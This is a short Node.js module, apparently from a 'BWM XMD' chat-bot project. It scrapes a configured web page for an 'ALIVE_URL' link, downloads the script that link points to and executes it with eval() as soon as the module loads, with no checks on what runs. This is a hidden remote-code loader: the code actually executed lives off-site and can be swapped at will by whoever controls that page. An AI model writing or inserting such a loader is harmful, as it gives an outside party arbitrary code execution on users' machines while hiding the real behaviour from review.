 // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchAliveUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const aliveUrlElement = $('a:contains("ALIVE_URL")');
    const aliveUrl = aliveUrlElement.attr('href');

    if (!aliveUrl) {
      throw new Error('Alive URL link not found...');
    }

    console.log('Alive URL fetched successfully ✅');

    const scriptResponse = await axios.get(aliveUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAliveUrl();
